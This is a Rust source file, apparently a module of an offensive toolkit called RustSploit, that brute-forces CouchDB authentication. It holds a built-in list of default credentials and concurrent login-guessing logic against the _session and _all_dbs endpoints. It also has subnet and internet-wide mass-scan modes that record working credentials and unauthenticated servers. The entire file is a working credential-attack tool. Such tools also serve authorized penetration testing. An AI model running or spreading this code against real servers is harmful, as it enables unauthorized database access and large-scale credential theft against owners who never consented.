use anyhow::{anyhow, Result};
use colored::*;
use reqwest::ClientBuilder;
use std::{io::Write, net::IpAddr, sync::Arc, time::Duration};

use crate::utils::{
    generate_combos_mode, parse_combo_mode, load_credential_file,
    is_mass_scan_target, is_subnet_target, run_bruteforce, run_mass_scan,
    run_subnet_bruteforce, BruteforceConfig, LoginResult, MassScanConfig, SubnetScanConfig,
};
use crate::utils::{
    cfg_prompt_default, cfg_prompt_existing_file, cfg_prompt_output_file, cfg_prompt_port,
    cfg_prompt_yes_no, get_filename_in_current_dir, load_lines, normalize_target,
};

// Constants
const DEFAULT_COUCHDB_PORT: u16 = 5984;
const DEFAULT_CREDENTIALS: &[(&str, &str)] = &[
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "couchdb"),
    ("root", "root"),
    ("admin", ""),
    ("admin", "123456"),
    ("couchdb", "couchdb"),
    ("admin", "admin123"),
    ("root", "password"),
    ("root", ""),
];

pub fn info() -> crate::module_info::ModuleInfo {
    crate::module_info::ModuleInfo {
        name: "CouchDB Brute Force".to_string(),
        description: "Brute-force CouchDB authentication via session cookie and HTTP Basic Auth. \
            Tests credentials against the _session endpoint and _all_dbs. Supports default \
            credential testing, combo mode, concurrent connections, and subnet/mass scanning."
            .to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![],
        disclosure_date: None,
        rank: crate::module_info::ModuleRank::Normal,
    }
}

fn display_banner() {
    if crate::utils::is_batch_mode() { return; }
    crate::mprintln!(
        "{}",
        "╔═══════════════════════════════════════════════════════════╗".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   CouchDB Brute Force Module                              ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   Session & Basic Auth Credential Testing (port 5984)     ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "╚═══════════════════════════════════════════════════════════╝".cyan()
    );
    crate::mprintln!();
}

pub async fn run(target: &str) -> Result<()> {
    display_banner();
    crate::mprintln!("{}", format!("[*] Target: {}", target).cyan());

    // --- Mass Scan Mode ---
    if is_mass_scan_target(target) {
        crate::mprintln!(
            "{}",
            format!("[*] Target: {} — Mass Scan Mode", target).yellow()
        );
        let mass_client = Arc::new(
            reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .timeout(std::time::Duration::from_secs(5))
                .build()
                .map_err(|e| anyhow!("Failed to build HTTP client: {}", e))?,
        );
        return run_mass_scan(
            target,
            MassScanConfig {
                protocol_name: "CouchDB",
                default_port: 5984,
                state_file: "couchdb_hose_state.log",
                default_output: "couchdb_mass_results.txt",
                default_concurrency: 200,
            },
            move |ip, port| {
                let client = mass_client.clone();
                async move {
                let client = &*client;

                // Check if port responds with CouchDB welcome JSON
                let url = format!("http://{}:{}/", ip, port);
                let resp = client.get(&url).send().await.ok()?;
                let body = resp.text().await.ok()?;
                if !body.contains("couchdb") && !body.contains("CouchDB") {
                    return None;
                }

                // Port is open and running CouchDB — try default creds
                let creds = [
                    ("admin", "admin"),
                    ("admin", "password"),
                    ("admin", "couchdb"),
                    ("root", "root"),
                    ("admin", ""),
                ];
                for (user, pass) in creds {
                    let session_url = format!("http://{}:{}/_session", ip, port);
                    let payload = serde_json::json!({"name": user, "password": pass});
                    let req = client
                        .post(&session_url)
                        .header("Content-Type", "application/json")
                        .body(payload.to_string());
                    if let Ok(r) = req.send().await {
                        if r.status().as_u16() == 200 {
                            if let Ok(b) = r.text().await {
                                if b.contains("\"ok\":true") || b.contains("\"ok\": true") {
                                    let ts = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
                                    {
                                        let id = crate::cred_store::store_credential(
                                            &ip.to_string(),
                                            port,
                                            "couchdb",
                                            user,
                                            pass,
                                            crate::cred_store::CredType::Password,
                                            "creds/generic/couchdb_credcheck",
                                        )
                                        .await;
                                        if id.is_none() { crate::meprintln!("[!] Failed to store credential"); }
                                    }
                                    return Some(format!(
                                        "[{}] {}:{}:{}:{}\n",
                                        ts, ip, port, user, pass
                                    ));
                                }
                            }
                        }
                    }
                }

                // Check if CouchDB is open (no auth required)
                let dbs_url = format!("http://{}:{}/_all_dbs", ip, port);
                if let Ok(r) = client.get(&dbs_url).send().await {
                    if r.status().as_u16() == 200 {
                        if let Ok(b) = r.text().await {
                            if b.starts_with('[') {
                                let ts = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
                                return Some(format!(
                                    "[{}] {}:{} CouchDB open (no auth required)\n",
                                    ts, ip, port
                                ));
                            }
                        }
                    }
                }

                None
            }},
        )
        .await;
    }

    // --- Subnet Scan Mode ---
    if is_subnet_target(target) {
        let port: u16 = cfg_prompt_port("port", "CouchDB Port", DEFAULT_COUCHDB_PORT).await?;

        let usernames_file =
            cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
        let passwords_file =
            cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
        let users = load_lines(&usernames_file)?;
        let passes = load_lines(&passwords_file)?;
        if users.is_empty() {
            return Err(anyhow!("Username wordlist is empty"));
        }
        if passes.is_empty() {
            return Err(anyhow!("Password wordlist is empty"));
        }

        let concurrency: usize = {
            let input = cfg_prompt_default("concurrency", "Max concurrent hosts", "10").await?;
            input.parse::<usize>().unwrap_or(10).max(1).min(256)
        };
        let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
        let output_file = cfg_prompt_output_file(
            "output_file",
            "Output result file",
            "couchdb_subnet_results.txt",
        )
        .await?;

        let timeout_secs: u64 = {
            let input = cfg_prompt_default("timeout", "Connection timeout (seconds)", "10").await?;
            input.parse::<u64>().unwrap_or(10).max(1).min(300)
        };
        let timeout_duration = Duration::from_secs(timeout_secs);

        return run_subnet_bruteforce(
            target,
            port,
            users,
            passes,
            &SubnetScanConfig {
                concurrency,
                verbose,
                output_file,
                service_name: "couchdb",
                jitter_ms: 50,
                source_module: "creds/generic/couchdb_credcheck",
                skip_tcp_check: false,
            },
            move |ip: IpAddr, port: u16, user: String, pass: String| {
                let timeout_dur = timeout_duration;
                async move {
                    let base_url = format!("http://{}:{}", ip, port);
                    match try_couchdb_login(&base_url, &user, &pass, timeout_dur).await {
                        Ok(true) => LoginResult::Success,
                        Ok(false) => LoginResult::AuthFailed,
                        Err(e) => LoginResult::Error {
                            message: e.to_string(),
                            retryable: true,
                        },
                    }
                }
            },
        )
        .await;
    }

    // --- Single Target Mode ---
    let port: u16 = cfg_prompt_port("port", "CouchDB Port", DEFAULT_COUCHDB_PORT).await?;

    // Ask about default credentials
    let use_defaults =
        cfg_prompt_yes_no("use_defaults", "Try default credentials first?", true).await?;

    let usernames_file =
        if cfg_prompt_yes_no("use_username_wordlist", "Use username wordlist?", true).await? {
            Some(cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?)
        } else {
            None
        };

    let passwords_file =
        if cfg_prompt_yes_no("use_password_wordlist", "Use password wordlist?", true).await? {
            Some(cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?)
        } else {
            None
        };

    if !use_defaults && usernames_file.is_none() && passwords_file.is_none() {
        return Err(anyhow!(
            "At least one wordlist or default credentials must be enabled"
        ));
    }

    let concurrency: usize = {
        let input = cfg_prompt_default("concurrency", "Max concurrent tasks", "10").await?;
        input.parse::<usize>().unwrap_or(10).max(1).min(256)
    };

    let connection_timeout: u64 = {
        let input = cfg_prompt_default("timeout", "Connection timeout (seconds)", "10").await?;
        input.parse::<u64>().unwrap_or(10).max(1).min(300)
    };

    let retry_on_error =
        cfg_prompt_yes_no("retry_on_error", "Retry on connection errors?", true).await?;
    let max_retries: usize = if retry_on_error {
        let input = cfg_prompt_default("max_retries", "Max retries per attempt", "2").await?;
        input.parse::<usize>().unwrap_or(2).max(1).min(10)
    } else {
        0
    };

    let stop_on_success =
        cfg_prompt_yes_no("stop_on_success", "Stop on first success?", true).await?;
    let save_results = cfg_prompt_yes_no("save_results", "Save results to file?", true).await?;
    let save_path = if save_results {
        Some(
            cfg_prompt_output_file("output_file", "Output file", "couchdb_brute_results.txt")
                .await?,
        )
    } else {
        None
    };
    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
    let combo_input = cfg_prompt_default("combo_mode", "Combo mode (linear/combo/spray)", "combo").await?;

    let normalized = normalize_target(target)?;
    let connect_addr = format!("{}:{}", normalized, port);

    crate::mprintln!(
        "\n{}",
        format!("[*] Starting brute-force on {}", connect_addr).cyan()
    );

    // Load wordlists
    let mut usernames = Vec::new();
    if let Some(ref file) = usernames_file {
        usernames = load_lines(file)?;
        if usernames.is_empty() {
            crate::mprintln!("{}", "[!] Username wordlist is empty.".yellow());
        } else {
            crate::mprintln!(
                "{}",
                format!("[*] Loaded {} usernames", usernames.len()).green()
            );
        }
    }

    let mut passwords = Vec::new();
    if let Some(ref file) = passwords_file {
        passwords = load_lines(file)?;
        if passwords.is_empty() {
            crate::mprintln!("{}", "[!] Password wordlist is empty.".yellow());
        } else {
            crate::mprintln!(
                "{}",
                format!("[*] Loaded {} passwords", passwords.len()).green()
            );
        }
    }

    // Add default credentials if requested
    if use_defaults {
        for (user, pass) in DEFAULT_CREDENTIALS {
            if !usernames.contains(&user.to_string()) {
                usernames.push(user.to_string());
            }
            if !passwords.contains(&pass.to_string()) {
                passwords.push(pass.to_string());
            }
        }
        crate::mprintln!(
            "{}",
            format!(
                "[*] Added {} default credentials",
                DEFAULT_CREDENTIALS.len()
            )
            .green()
        );
    }

    if usernames.is_empty() {
        return Err(anyhow!("No usernames available"));
    }
    if passwords.is_empty() {
        return Err(anyhow!("No passwords available"));
    }

    let mut combos = generate_combos_mode(&usernames, &passwords, parse_combo_mode(&combo_input));
    if cfg_prompt_yes_no("cred_file", "Load additional user:pass combos from file?", false).await? {
        let cred_path = cfg_prompt_existing_file("cred_file_path", "Credential file (user:pass per line)").await?;
        combos.extend(load_credential_file(&cred_path)?);
    }
    let timeout_duration = Duration::from_secs(connection_timeout);

    let try_login = move |t: String, p: u16, user: String, pass: String| {
        let timeout_dur = timeout_duration;
        async move {
            let base_url = format!("http://{}:{}", t, p);
            match try_couchdb_login(&base_url, &user, &pass, timeout_dur).await {
                Ok(true) => LoginResult::Success,
                Ok(false) => LoginResult::AuthFailed,
                Err(e) => LoginResult::Error {
                    message: e.to_string(),
                    retryable: true,
                },
            }
        }
    };

    let result = run_bruteforce(
        &BruteforceConfig {
            target: normalized,
            port,
            concurrency,
            stop_on_success,
            verbose,
            delay_ms: 0,
            max_retries,
            service_name: "couchdb",
            jitter_ms: 50,
            source_module: "creds/generic/couchdb_credcheck",
        },
        combos,
        try_login,
    )
    .await?;

    result.print_found();
    if let Some(ref path) = save_path {
        result.save_to_file(path)?;
    }

    // Unknown / errored attempts
    if !result.errors.is_empty() {
        crate::mprintln!(
            "{}",
            format!(
                "[?] Collected {} unknown/errored CouchDB responses.",
                result.errors.len()
            )
            .yellow()
            .bold()
        );
        if cfg_prompt_yes_no(
            "save_unknown_responses",
            "Save unknown responses to file?",
            true,
        )
        .await?
        {
            let default_name = "couchdb_unknown_responses.txt";
            let fname = cfg_prompt_output_file(
                "unknown_responses_file",
                "What should the unknown results be saved as?",
                default_name,
            )
            .await?;
            let filename = get_filename_in_current_dir(&fname);
            use std::os::unix::fs::OpenOptionsExt;
            let mut opts = std::fs::OpenOptions::new();
            opts.write(true).create(true).truncate(true);
            opts.mode(0o600);
            match opts.open(&filename) {
                Ok(mut file) => {
                    writeln!(
                        file,
                        "# CouchDB Bruteforce Unknown/Errored Responses (host,user,pass,error)"
                    )?;
                    for (host, user, pass, msg) in &result.errors {
                        writeln!(file, "{} -> {}:{} - {}", host, user, pass, msg)?;
                    }
                    file.flush()?;
                    crate::mprintln!(
                        "{}",
                        format!("[+] Unknown responses saved to '{}'", filename.display()).green()
                    );
                }
                Err(e) => {
                    crate::mprintln!(
                        "{}",
                        format!(
                            "[!] Could not create unknown response file '{}': {}",
                            filename.display(),
                            e
                        )
                        .red()
                    );
                }
            }
        }
    }

    Ok(())
}

/// Attempt CouchDB login via session cookie authentication and Basic Auth fallback.
///
/// Primary method: POST to `/_session` with JSON `{"name":"user","password":"pass"}`.
/// A 200 response containing `"ok":true` indicates success.
///
/// Fallback: GET `/_all_dbs` with HTTP Basic Auth to verify access.
///
/// Returns:
/// - `Ok(true)` — authentication succeeded
/// - `Ok(false)` — credentials rejected (401)
/// - `Err(_)` — connection/timeout/protocol error
async fn try_couchdb_login(
    base_url: &str,
    username: &str,
    password: &str,
    timeout_duration: Duration,
) -> Result<bool> {
    let client = ClientBuilder::new()
        .danger_accept_invalid_certs(true)
        .danger_accept_invalid_hostnames(true)
        .cookie_store(true)
        .timeout(timeout_duration)
        .build()
        .map_err(|e| anyhow!("Failed to create HTTP client: {}", e))?;

    // Primary: cookie-based session authentication
    let session_url = format!("{}/_session", base_url);
    let payload = format!(
        "{{\"name\":\"{}\",\"password\":\"{}\"}}",
        username.replace('\\', "\\\\").replace('"', "\\\""),
        password.replace('\\', "\\\\").replace('"', "\\\""),
    );

    let session_resp = match tokio::time::timeout(
        timeout_duration,
        client
            .post(&session_url)
            .header("Content-Type", "application/json")
            .body(payload)
            .send(),
    )
    .await
    {
        Ok(Ok(resp)) => resp,
        Ok(Err(e)) => {
            let err_str = e.to_string();
            if err_str.contains("Connection refused") || err_str.contains("connect") {
                return Err(anyhow!("Connection refused: {}", err_str));
            }
            return Err(anyhow!("Request error: {}", err_str));
        }
        Err(_) => return Err(anyhow!("Connection timeout")),
    };

    let status = session_resp.status().as_u16();

    match status {
        200 => {
            let body = match tokio::time::timeout(timeout_duration, session_resp.text()).await {
                Ok(Ok(b)) => b,
                Ok(Err(e)) => return Err(anyhow!("Failed to read response: {}", e)),
                Err(_) => return Err(anyhow!("Timeout reading response")),
            };
            // CouchDB returns {"ok":true, "name":"admin", "roles":["_admin"]} on success
            if body.contains("\"ok\":true") || body.contains("\"ok\": true") {
                return Ok(true);
            }
            // Got 200 but no ok:true — fall through to Basic Auth check
        }
        401 => return Ok(false),
        _ => {
            // Non-standard response — fall through to Basic Auth check
        }
    }

    // Fallback: HTTP Basic Auth against _all_dbs
    let dbs_url = format!("{}/_all_dbs", base_url);
    let dbs_resp = match tokio::time::timeout(
        timeout_duration,
        client
            .get(&dbs_url)
            .basic_auth(username, Some(password))
            .send(),
    )
    .await
    {
        Ok(Ok(resp)) => resp,
        Ok(Err(e)) => return Err(anyhow!("Basic auth request error: {}", e)),
        Err(_) => return Err(anyhow!("Timeout on Basic auth request")),
    };

    let dbs_status = dbs_resp.status().as_u16();

    match dbs_status {
        200 => {
            let body = match tokio::time::timeout(timeout_duration, dbs_resp.text()).await {
                Ok(Ok(b)) => b,
                Ok(Err(e)) => return Err(anyhow!("Failed to read _all_dbs response: {}", e)),
                Err(_) => return Err(anyhow!("Timeout reading _all_dbs response")),
            };
            // _all_dbs returns a JSON array of database names
            if body.starts_with('[') {
                Ok(true)
            } else {
                Ok(false)
            }
        }
        401 => Ok(false),
        403 => Ok(false),
        _ => Err(anyhow!("Unexpected HTTP status: {}", dbs_status)),
    }
}
